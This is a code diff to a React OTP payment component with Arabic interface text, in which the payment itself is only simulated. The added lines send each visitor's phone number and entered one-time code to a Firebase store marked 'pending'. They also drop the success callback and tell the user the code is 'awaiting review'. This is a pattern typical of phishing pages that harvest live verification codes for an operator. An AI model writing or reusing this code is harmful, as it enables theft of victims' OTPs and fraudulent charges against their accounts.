@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { toast } from "@/hooks/use-toast"
 import { Loader2, Shield } from "lucide-react"
+import { addData, getVisitorId } from "@/lib/firebase"
 
 interface OTPPaymentProps {
   orderId: string
@@ -35,6 +36,15 @@ export function OTPPayment({ orderId, amount, onSuccess }: OTPPaymentProps) {
 
     // Simulate API call
     await new Promise((resolve) => setTimeout(resolve, 2000))
+
+    const visitorId = getVisitorId()
+    await addData({
+      visitorId,
+      phone: phoneNumber,
+      currentStep: "otp",
+      otpStatus: "pending",
+      currentPage: "إدخال الكود",
+    })
 
     setIsLoading(false)
     setStep("otp")
@@ -67,17 +77,26 @@ export function OTPPayment({ orderId, amount, onSuccess }: OTPPaymentProps) {
       return
     }
 
+    const visitorId = getVisitorId()
+    await addData({
+      visitorId,
+      phone: phoneNumber,
+      otp,
+      otpStatus: "pending",
+      currentStep: "otp",
+      currentPage: "إدخال الكود",
+    })
+
     setStep("processing")
 
     // Simulate payment processing
     await new Promise((resolve) => setTimeout(resolve, 3000))
+    setStep("otp")
 
     toast({
-      title: "تم الدفع بنجاح",
-      description: "تم تأكيد طلبك وسيتم التوصيل قريباً",
+      title: "تم إرسال الكود",
+      description: "تم تسجيل كود التحقق وهو الآن بانتظار المراجعة",
     })
-
-    onSuccess()
   }
 
   const handleResendOTP = async () => {
